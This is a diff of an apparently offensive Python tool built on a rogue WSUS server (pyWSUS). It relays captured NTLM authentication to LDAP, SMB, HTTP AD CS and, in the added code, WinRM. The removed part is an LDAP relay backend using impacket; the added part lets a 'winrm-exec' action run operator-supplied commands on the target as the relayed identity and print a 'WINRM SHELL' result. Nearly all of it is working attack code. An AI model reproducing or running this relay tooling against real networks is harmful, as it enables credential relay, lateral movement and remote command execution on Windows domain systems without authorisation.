-            LDAPRelayClient,
-            LDAPSRelayClient,
-            LDAPRelayClientException,
-            ERROR_MESSAGES,
-            STATUS_SUCCESS,
-            BASE,
-        )
-
-    @staticmethod
-    def _decode_token(token):
-        return base64.b64decode(token)
-
-    @staticmethod
-    def _status_name(error_messages, status):
-        name, _ = error_messages.get(status, ("UNKNOWN", ""))
-        return name
-
-    @staticmethod
-    def _ldap_value(value):
-        if isinstance(value, bytes):
-            return value.decode("utf-8", errors="replace")
-        if isinstance(value, (list, tuple)):
-            return [LDAPNTLMRelayBackend._ldap_value(item) for item in value]
-        return str(value)
-
-    @classmethod
-    def _entry_attributes(cls, session):
-        entries = getattr(session, "entries", []) or []
-        if not entries:
-            return {}
-
-        attributes = getattr(entries[0], "entry_attributes_as_dict", {}) or {}
-        return {
-            key: cls._ldap_value(value)
-            for key, value in attributes.items()
-        }
-
-    @staticmethod
-    def _ldap_result(session):
-        result = getattr(session, "result", {}) or {}
-        return {
-            "ldap_result_code": result.get("result", ""),
-            "ldap_result_description": result.get("description", ""),
-            "ldap_diagnostic_message": result.get("message", ""),
-        }
-
-    @staticmethod
-    def _first_ldap_value(value):
-        if isinstance(value, list):
-            return value[0] if value else ""
-        return value or ""
-
-    def _new_client(self):
-        (
-            LDAPRelayClient,
-            LDAPSRelayClient,
-            _,
-            _,
-            _,
-            _,
-        ) = self._load_impacket()
-        client_class = LDAPSRelayClient if self.scheme == "ldaps" else LDAPRelayClient
-        return client_class(_LDAPRelayConfig(), self.target, self.port)
-
-    def _session_info(self, client):
-        return {
-            "ldap_target": f"{self.host}:{self.port}",
-            "ldap_transport": self.scheme,
-            "ldap_server_info_available": bool(
-                getattr(getattr(client, "session", None), "server", None)
-            ),
-        }
-
-    def _rootdse(self, client):
-        _, _, _, _, _, base_scope = self._load_impacket()
-        session = client.session
-        success = session.search(
-            search_base="",
-            search_filter="(objectClass=*)",
-            search_scope=base_scope,
-            attributes=list(self.ROOTDSE_ATTRIBUTES),
-        )
-        attributes = self._entry_attributes(session)
-        result = {
-            "ldap_rootdse_ok": bool(success),
-            "ldap_default_naming_context": self._first_ldap_value(
-                attributes.get("defaultNamingContext", "")
-            ),
-            "ldap_dns_host_name": self._first_ldap_value(
-                attributes.get("dnsHostName", "")
-            ),
-            "ldap_naming_contexts": attributes.get("namingContexts", []),
-            "ldap_supported_versions": attributes.get("supportedLDAPVersion", []),
-            "ldap_supported_sasl_mechanisms": attributes.get(
-                "supportedSASLMechanisms", []
-            ),
-            "ldap_vendor_name": self._first_ldap_value(
-                attributes.get("vendorName", "")
-            ),
-        }
-        result.update(self._ldap_result(session))
-        return result
-
-    def _whoami(self, client):
-        session = client.session
-        success = session.extend.standard.who_am_i()
-        result = {
-            "ldap_whoami_ok": bool(success),
-            "ldap_whoami": self._ldap_value(
-                (getattr(session, "result", {}) or {}).get("responseValue", "")
-            ),
-        }
-        result.update(self._ldap_result(session))
-        return result
-
-    def _base_search(self, client):
-        _, _, _, _, _, base_scope = self._load_impacket()
-        rootdse = self._rootdse(client)
-        base_dn = rootdse.get("ldap_default_naming_context", "")
-        if not base_dn:
-            return {
-                **rootdse,
-                "ldap_base_search_ok": False,
-                "ldap_base_search_error": "defaultNamingContext was not returned",
-                "ldap_base_dn": "",
-                "ldap_base_object_dn": "",
-                "ldap_base_object_classes": [],
-            }
-
-        session = client.session
-        success = session.search(
-            search_base=base_dn,
-            search_filter="(objectClass=*)",
-            search_scope=base_scope,
-            attributes=["distinguishedName", "objectClass", "name"],
-        )
-        attributes = self._entry_attributes(session)
-        entries = getattr(session, "entries", []) or []
-        entry_dn = str(getattr(entries[0], "entry_dn", "")) if entries else ""
-        result = {
-            **rootdse,
-            "ldap_base_search_ok": bool(success),
-            "ldap_base_search_error": "",
-            "ldap_base_dn": base_dn,
-            "ldap_base_object_dn": entry_dn,
-            "ldap_base_object_classes": attributes.get("objectClass", []),
-        }
-        result.update(self._ldap_result(session))
-        return result
-
-    def preflight(self):
-        client = self._new_client()
-        try:
-            if not client.initConnection():
-                raise RuntimeError("LDAP target connection failed")
-
-            result = {
-                "ldap_preflight": True,
-                "authenticated": False,
-                "service": "ldap",
-                "service_validated": False,
-                **self._session_info(client),
-            }
-            result.update(self._rootdse(client))
-            result["service_validated"] = result["ldap_rootdse_ok"]
-            return result
-        finally:
-            client.killConnection()
-
-    def start_type1(self, session_key, type1_token):
-        client = self._new_client()
-
-        try:
-            with self.lock:
-                old_session = self.sessions.pop(session_key, None)
-            if old_session:
-                old_session["client"].killConnection()
-
-            if not client.initConnection():
-                raise RuntimeError("LDAP target connection failed")
-
-            challenge = client.sendNegotiate(self._decode_token(type1_token))
-            if not challenge:
-                raise RuntimeError("LDAP target did not return NTLM Type 2")
-
-            with self.lock:
-                self.sessions[session_key] = {
-                    "client": client,
-                    "created_at": time.time(),
-                    "target_status_type2": "LDAP_SICILY_NEGOTIATE_NTLM",
-                    "session_info": self._session_info(client),
-                }
-
-            return base64.b64encode(challenge.getData()).decode("ascii")
-        except Exception:
-            client.killConnection()
-            raise
-
-    def finish_type3(self, session_key, type3_token, identity="", username=""):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if not session:
-            raise RuntimeError("missing relay session for Type 3")
-
-        client = session["client"]
-        _, _, ldap_error, error_messages, status_success, _ = self._load_impacket()
-        authenticated = False
-
-        try:
-            try:
-                _, status = client.sendAuth(self._decode_token(type3_token))
-                reason = self._status_name(error_messages, status)
-                authenticated = status == status_success
-                error = ""
-            except ldap_error as err:
-                status = None
-                reason = "LDAP_RELAY_ERROR"
-                authenticated = False
-                error = str(err)
-
-            result = {
-                "status": status,
-                "reason": reason,
-                "authenticated": authenticated,
-                "type3_accepted": authenticated,
-                "auth_validation": "ldap-bind" if authenticated else "rejected",
-                "action": self.action,
-                "target_status_type2": session.get("target_status_type2"),
-                "service": "ldap",
-                "service_validated": authenticated,
-                "identity": identity,
-                "username": username,
-                "ldap_action_state": "not-run",
-                "ldap_action_error": error,
-                "ldap_rootdse_ok": None,
-                "ldap_whoami_ok": None,
-                "ldap_base_search_ok": None,
-                **session.get("session_info", {}),
-                **self._ldap_result(client.session),
-            }
-
-            if not authenticated:
-                if "signing is enabled" in error.lower():
-                    result["ldap_signing_required"] = True
-                return result
-
-            if self.action == "ldap-rootdse":
-                action_result = self._rootdse(client)
-                result.update(action_result)
-                result["ldap_action_state"] = (
-                    "rootdse-read" if action_result["ldap_rootdse_ok"] else "rootdse-failed"
-                )
-                result["service_validated"] = action_result["ldap_rootdse_ok"]
-            elif self.action == "ldap-whoami":
-                action_result = self._whoami(client)
-                result.update(action_result)
-                result["ldap_action_state"] = (
-                    "whoami-read" if action_result["ldap_whoami_ok"] else "whoami-failed"
-                )
-                result["service_validated"] = action_result["ldap_whoami_ok"]
-            elif self.action == "ldap-base-search":
-                action_result = self._base_search(client)
-                result.update(action_result)
-                result["ldap_action_state"] = (
-                    "base-read"
-                    if action_result["ldap_base_search_ok"]
-                    else "base-search-failed"
-                )
-                result["service_validated"] = action_result["ldap_base_search_ok"]
-            else:
-                result["ldap_action_state"] = "auth-only"
-
-            return result
-        except Exception as err:
-            return {
-                "status": None,
-                "reason": "LDAP_ACTION_ERROR",
-                "authenticated": authenticated,
-                "type3_accepted": authenticated,
-                "auth_validation": "ldap-bind" if authenticated else "rejected",
-                "action": self.action,
-                "target_status_type2": session.get("target_status_type2"),
-                "service": "ldap",
-                "service_validated": False,
-                "identity": identity,
-                "username": username,
-                "ldap_action_state": "action-error",
-                "ldap_action_error": str(err),
-                "ldap_rootdse_ok": None,
-                "ldap_whoami_ok": None,
-                "ldap_base_search_ok": None,
-                **session.get("session_info", {}),
-                **self._ldap_result(client.session),
-            }
-        finally:
-            client.killConnection()
-
-    def drop_session(self, session_key):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if session:
-            session["client"].killConnection()
-
-    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
-        now = time.time()
-        with self.lock:
-            stale = [
-                key for key, session in self.sessions.items()
-                if now - session.get("created_at", now) > max_age
-            ]
-            sessions = [self.sessions.pop(key) for key in stale]
-
-        for session in sessions:
-            session["client"].killConnection()
-
-        return len(sessions)
-
-
-# ---------------------------------------------------------------------------
-# KB generation
-# ---------------------------------------------------------------------------
 
 def _random_kb() -> str:
     """Random KB in the Win10/11 monthly rollup band (5000000–5099999)."""
@@ -2188,6 +741,41 @@ def _report_relay_outcome(ip, path, mode, identity, result):
             _log(1, ip, "CERT DENIED", f"identity={identity} rejected  state={state}")
         return
 
+    if mode == "relay-winrm":
+        wstate = result.get("winrm_state", "")
+        if wstate == "executed":
+            out = (result.get("winrm_output", "") or "").rstrip()
+            with _out_lock:
+                _console.rule("[bold bright_green]WINRM SHELL[/]", style="bright_green")
+                _console.print(
+                    f"    [bold bright_green]{identity}[/]  ->  "
+                    f"[bold]{result.get('winrm_command', '')}[/]  "
+                    f"[dim](exit={result.get('winrm_exit_code')})[/]"
+                )
+                for line in out.splitlines() or [""]:
+                    _console.print(f"      [white]{line}[/]")
+                _console.rule(style="bright_green")
+            return
+        if wstate == "encryption-required":
+            _log(0, ip, "WARN",
+                 f"identity={identity} authenticated=True but WinRM requires message encryption "
+                 f"(AllowUnencrypted=false) - command blocked. product={result.get('winrm_product','')}")
+            return
+        if wstate == "identified":
+            _log(0, ip, "RelayAuth",
+                 f"identity={identity} WinRM reachable + authenticated  product={result.get('winrm_product','')}")
+            return
+        extra = ""
+        if wstate == "auth-failed":
+            extra = f" http_status={result.get('winrm_http_status','')}"
+            wa = result.get("winrm_www_auth", "")
+            if wa:
+                extra += f" www-auth='{wa[:40]}'"
+        _log(0, ip, "RelayAuth" if authed else "WARN",
+             f"identity={identity} authenticated={authed} winrm_state={wstate or 'n/a'}{extra} "
+             f"fault={result.get('winrm_fault','') or result.get('winrm_error','')}")
+        return
+
     if mode == "relay-smb":
         # For SMB the operator is watching signing + what the action returned, so surface
         # those, not just "validated". A machine account often authenticates (relay works)
@@ -2523,9 +1111,10 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                 self._send_ntlm_401(type2, proxy=proxy)
                 return "handled"
 
-            if mode in ("relay-http", "relay-smb", "relay-ldap"):
+            if mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                 relay_label = {
                     "relay-http": "HTTP",
+                    "relay-winrm": "WinRM",
                     "relay-smb": "SMB",
                     "relay-ldap": "LDAP",
                 }[mode]
@@ -2571,7 +1160,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                 identity = f'{parsed["domain"]}\\{parsed["username"]}'
 
             session = None
-            if mode in ("capture", "relay-http", "relay-smb", "relay-ldap"):
+            if mode in ("capture", "relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                 with self.server.ntlm_lock:
                     session = self.server.ntlm_sessions.pop(session_key, None)
             challenge = session["challenge"] if session else None
@@ -2628,9 +1217,10 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                         direction="request",
                     )
 
-            if mode in ("relay-http", "relay-smb", "relay-ldap"):
+            if mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                 relay_label = {
                     "relay-http": "HTTP",
+                    "relay-winrm": "WinRM",
                     "relay-smb": "SMB",
                     "relay-ldap": "LDAP",
                 }[mode]
@@ -2711,6 +1301,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                     _emit_json_event(
                         {
                             "relay-http": "http_relay_result",
+                            "relay-winrm": "winrm_relay_result",
                             "relay-smb": "smb_relay_result",
                             "relay-ldap": "ldap_relay_result",
                         }[mode],
@@ -2724,6 +1315,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                     _emit_json_event(
                         {
                             "relay-http": "http_relay_error",
+                            "relay-winrm": "winrm_relay_error",
                             "relay-smb": "smb_relay_error",
                             "relay-ldap": "ldap_relay_error",
                         }[mode],
@@ -2947,6 +1539,7 @@ def run(
     ntlm_session_key="ip",
     ntlm_protect_downloads=False,
     relay_preflight=False,
+    winrm_command=None,
 ):
     global _active_relay_backend
 
@@ -2965,6 +1558,12 @@ def run(
             adcs_template=adcs_template,
             adcs_alt_name=adcs_alt_name,
             adcs_loot_dir=adcs_loot_dir,
+        )
+    elif ntlm_mode == "relay-winrm":
+        httpd.ntlm_relay_backend = HTTPNTLMRelayBackend(
+            relay_target,
+            action=(relay_action if relay_action in ("winrm-id", "winrm-exec") else "winrm-id"),
+            winrm_command=winrm_command,
         )
     elif ntlm_mode == "relay-smb":
         httpd.ntlm_relay_backend = SMBNTLMRelayBackend(
@@ -3096,11 +1695,12 @@ def parse_args():
             "challenge-only",
             "capture",
             "relay-http",
+            "relay-winrm",
             "relay-smb",
             "relay-ldap",
         ],
         default="off",
-        help="NTLM behavior. off = normal pyWSUS. challenge-only = stop after Type 1. capture = local Type 2/Type 3. relay-http = relay NTLM to HTTP. relay-smb = relay NTLM to SMB. relay-ldap = relay NTLM to LDAP/LDAPS.",
+        help="NTLM behavior. off = normal pyWSUS. challenge-only = stop after Type 1. capture = local Type 2/Type 3. relay-http = relay NTLM to HTTP. relay-winrm = relay NTLM to WinRM (WS-Man). relay-smb = relay NTLM to SMB. relay-ldap = relay NTLM to LDAP/LDAPS.",
     )
     ntlm.add_argument(
         "--relay-target",
@@ -3118,9 +1718,17 @@ def parse_args():
             "ldap-rootdse",
             "ldap-whoami",
             "ldap-base-search",
+            "winrm-id",
+            "winrm-exec",
         ],
         default="auth-only",
-        help="Post-auth relay action. auth-only = bind proof. adcs-certsrv/adcs-issue = HTTP AD CS. list-shares/keep-session = SMB. ldap-* = read-only LDAP validation.",
+        help="Post-auth relay action. auth-only = bind proof. adcs-certsrv/adcs-issue = HTTP AD CS. list-shares/keep-session = SMB. ldap-* = read-only LDAP validation. winrm-id = WS-Man Identify proof. winrm-exec = run --winrm-command.",
+    )
+    ntlm.add_argument(
+        "--winrm-command",
+        default=None,
+        metavar="CMD",
+        help="Command run by --relay-action winrm-exec (default: whoami). Needs the WinRM target to allow unencrypted messages and the relayed identity to be WinRM-authorised.",
     )
     ntlm.add_argument(
         "--relay-adcs-marker",
@@ -3193,7 +1801,7 @@ def _rotate_session(executable_file, executable_name, client_address, command):
 if __name__ == '__main__':
     args = parse_args()
 
-    if args.ntlm_mode in ("relay-http", "relay-smb", "relay-ldap"):
+    if args.ntlm_mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
         if not args.relay_target:
             _console.print(f"[bold red][ERROR][/] --relay-target is required with --ntlm-mode {args.ntlm_mode}")
             sys.exit(1)
@@ -3216,6 +1824,15 @@ if __name__ == '__main__':
                 and not parsed_relay_target.path.rstrip("/").lower().endswith("/certsrv")
             ):
                 _console.print("[bold yellow][WARN][/] AD CS relay actions usually expect --relay-target ending in /certsrv/")
+        elif args.ntlm_mode == "relay-winrm":
+            if parsed_relay_target.scheme not in ("http", "https") or not parsed_relay_target.hostname:
+                _console.print("[bold red][ERROR][/] --relay-target must be http://host:5985/wsman or https://host:5986/wsman with --ntlm-mode relay-winrm")
+                sys.exit(1)
+            if args.relay_action not in ("auth-only", "winrm-id", "winrm-exec"):
+                _console.print("[bold red][ERROR][/] relay-winrm supports --relay-action winrm-id or winrm-exec")
+                sys.exit(1)
+            if not parsed_relay_target.path.rstrip("/").lower().endswith("/wsman"):
+                _console.print("[bold yellow][WARN][/] WinRM relay usually expects --relay-target ending in /wsman")
         elif args.ntlm_mode == "relay-smb":
             if parsed_relay_target.scheme != "smb" or not parsed_relay_target.hostname:
                 _console.print("[bold red][ERROR][/] --relay-target must be smb://host[:port]/ with --ntlm-mode relay-smb")
@@ -3317,6 +1934,7 @@ if __name__ == '__main__':
             args.ntlm_session_key,
             args.ntlm_protect_downloads,
             args.relay_preflight,
+            args.winrm_command,
         ),
         daemon=True
     )
